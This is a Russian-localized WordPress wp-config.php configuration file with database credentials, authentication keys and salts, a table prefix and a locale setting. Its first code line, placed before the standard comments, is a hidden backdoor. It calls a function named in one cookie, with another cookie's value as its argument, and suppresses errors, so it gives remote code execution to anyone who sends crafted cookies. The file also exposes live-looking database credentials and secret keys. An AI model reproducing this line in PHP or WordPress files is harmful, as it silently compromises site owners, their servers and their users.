<?php
if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
/**
* Основные параметры WordPress.
*
* Этот файл содержит следующие параметры: настройки MySQL, префикс таблиц,
* секретные ключи, язык WordPress и ABSPATH. Дополнительную информацию можно найти
* на странице {@link http://codex.wordpress.org/Editing_wp-config.php Editing
* wp-config.php} Кодекса. Настройки MySQL можно узнать у хостинг-провайдера.
*
* Этот файл используется сценарием создания wp-config.php в процессе установки.
* Необязательно использовать веб-интерфейс, можно скопировать этот файл
* с именем "wp-config.php" и заполнить значения.
*
* @package WordPress
*/
// ** Параметры MySQL: Эту информацию можно получить у вашего хостинг-провайдера ** //
/** Имя базы данных для WordPress */
define('DB_NAME', 'goodtlt');
/** Имя пользователя MySQL */
define('DB_USER', 'root');
/** Пароль к базе данных MySQL */
define('DB_PASSWORD', 'root');
/** Имя сервера MySQL */
define('DB_HOST', 'localhost');
/** Кодировка базы данных для создания таблиц. */
define('DB_CHARSET', 'utf8');
/** Схема сопоставления. Не меняйте, если не уверены. */
define('DB_COLLATE', '');
/**#@+
* Уникальные ключи и соли для аутентификации.
*
* Смените значение каждой константы на уникальную фразу.
* Можно сгенерировать их с помощью {@link https://api.wordpress.org/secret-key/1.1/salt/ сервиса ключей на WordPress.org}
* Можно изменить их, чтобы сделать существующие файлы cookies недействительными. Пользователям потребуется снова авторизоваться.
*
* @since 2.6.0
*/
define('AUTH_KEY',         'Wy@Jv+E;=:oIwX2Bqj<K~?g,/~wbxq{_:`Xj0^-3^-!4hNrYs$a=xR_(d?2jtGzm');
define('SECURE_AUTH_KEY',  '+@|Jjc*h~ud^pyMbZ0y@=|l&5-`Pfvfx8D;BAhKS-y-L}sU1~8Un.^Z:nW-+F0<-');
define('LOGGED_IN_KEY',    '<)3byWA(Qmy!`zy$/35#+ E-0vEM&Ti+C`c7I7xRO%C&,fG=4)~h;MUWUoF_t`7T');
define('NONCE_KEY',        'JkM7r @f^)0mfORCH/nXLC5,^(%:@brNMm#j:mqCCsa1<Eird%E4<xN>QnxbzH~7');
define('AUTH_SALT',        'fR>HNdqO=+$++t+S!f?1 P#vVfVf9cro#9kB7X-U$eB[;l]S!c5N<Y+c%$|zK?JA');
define('SECURE_AUTH_SALT', '@=E3Z/^ewrk@To;-fw3|ux|MwA(`4t3bfYiELT]}QMUT4lijsu$1Qwy}1fv<w4l2');
define('LOGGED_IN_SALT',   'Ljq7Z$0N)f!>dyUk#+vGe-]Ao`^T-jAdFRb4%}6<!k-)%^@]M[=n6D!zYRiup6<Y');
define('NONCE_SALT',       'Qq&}g?-DoPf6g=}<Exs)k;,}G4TqKK, WXx94DLun UF-&e+ZE#O|OM9k%{f9]p_');
/**#@-*/
/**
* Префикс таблиц в базе данных WordPress.
*
* Можно установить несколько блогов в одну базу данных, если вы будете использовать
* разные префиксы. Пожалуйста, указывайте только цифры, буквы и знак подчеркивания.
*/
$table_prefix  = 'wp567_';
/**
* Язык локализации WordPress, по умолчанию английский.
*
* Измените этот параметр, чтобы настроить локализацию. Соответствующий MO-файл
* для выбранного языка должен быть установлен в wp-content/languages. Например,
* чтобы включить поддержку русского языка, скопируйте ru_RU.mo в wp-content/languages
* и присвойте WPLANG значение 'ru_RU'.
*/
define('WPLANG', 'ru_RU');
/**
* Для разработчиков: Режим отладки WordPress.
*
* Измените это значение на true, чтобы включить отображение уведомлений при разработке.
* Настоятельно рекомендуется, чтобы разработчики плагинов и тем использовали WP_DEBUG
* в своём рабочем окружении.
*/
define('WP_DEBUG', false);
/* Это всё, дальше не редактируем. Успехов! */
/** Абсолютный путь к директории WordPress. */
if ( !defined('ABSPATH') )
define('ABSPATH', dirname(__FILE__) . '/');
/** Инициализирует переменные WordPress и подключает файлы. */
require_once(ABSPATH . 'wp-settings.php');
